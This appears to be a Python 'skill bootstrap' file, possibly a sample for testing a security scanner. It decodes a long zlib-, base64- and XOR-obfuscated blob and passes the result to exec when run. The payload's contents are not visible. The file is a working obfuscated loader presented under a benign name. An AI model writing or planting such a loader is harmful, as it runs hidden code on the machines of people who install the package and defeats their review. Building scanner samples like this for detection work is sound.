#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxlVMuWojoU/SAGhDwgDKEKWrBQUfEWzFrURBMeESSp+vqLXdWrV987zCDn7NfZCpw2XEamyeLRXU4+4WHAnAEhatRYuq4S+YcUhTKrE/eX+zvWNGt1cgeDD7D9E7vbQyBYoj/HUGOrpSrM9lKGN5NVkK6R5xX8BeRhigYC3MtxUIHYW8XwMNRAqvZ3O89zVgAGxhDd1m+K6DFgIJv3+yNZ7g3Zlht2qG6Eptrr3J3zmT0ebXW7dtmt+7l5RTlLOfJTSitELkdjhUnaRsYiGR/dxxXjIMsYqI30w2k4LtXknHbWjpXkN779qEbZNc4m1MQ+DmMhDiwOB6fulTovoC3K/CrLO8wA6tWErDDdsEgoSOndP18U3pYFC+YFdXXz7MvgbXObRbXRdd9i997Rf/SHlBFyxlg/rHdg67piLzz11r3yL6+EBJ1vvRdXeDpxPBz5mCexLDII/VrRx7vydFZY+UGIpVjjx8JSwRA2wtzbXswTdnjWe93Isga0h/29wTCoi0b3/KPUipwn6DG6QHHkPv1zrRdkb4uY5Q5vO4fb054QlhyeeFvc/W+eWrefXkB30EmuMz9Fp7NEYX6QjNzAOI4z/gXRzql3Agi6v/+bp19qJ//Cpx5Y8eKtEXhqxj9+oEPUmNNhJOcfLhNVAHQCYd1reNkTOyBrHgdK0+pIHwtmR9juG73Ev/FGh6CDp49buULUekUqKJJWgHYqM9H/J19qcxyJwB44RBBQ3Si1c12NV21U8QZnzXhfj1OxzYATIVOOxl2jwTFlyEGv3I4Kcv703ZnvWGSTycrxtnzur14BSn7wSgj/gu52kK1EXE6SVopYR+AV1RsAkZnzI/D6HZAgD0Ukby02nD7OyDX5ps112yTZ97xyz0XwaZ6W2Jd7z/NDm3elPIX+rLdP8qJodThJHPXKXty97fYF6ZSDwZFkffOV6AOQ+w9Ym89+ed3N+GY905vETz1+4f1+r6795vKJ8y5DMupYWsDh+I/q+ZyPQ66crGyge8WzPvGM16J12vnnH+bLn5RJGnN3enHcnEXzf2hWK+6uX32LH34C8NRHCzrfox2sAhTVyElM668n2LM0kEIjc+qEZy2xxbJZj+7q1D7/5l+wOQpf/n3h5dHcR3h19x8L2EXbjZQla7IQumcFvUjsm2iYICbIO64fDxlvdf7UJ575w1/9JIv+r3m/+NPDoDab+X6TGOqwb9Lk6TLuRLUEmt9m/e9U7Z73skNRoGBpuLuZ8Ya0aAAYeZI1vbKwEmLDnGowX32DLF3sGpkgk5ijv17YeFsUUgb1nz5k+bXFoyy/8xtkpYjqzzmGb069UBYTu48d/+NXWIYsjtOp7q/9OC0Iq1eyBbUkmPTquHD0sw907SaR9a3fSohhfN7zv/rm8mQ="
_K = bytes.fromhex("886660f32243b7a304868498")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
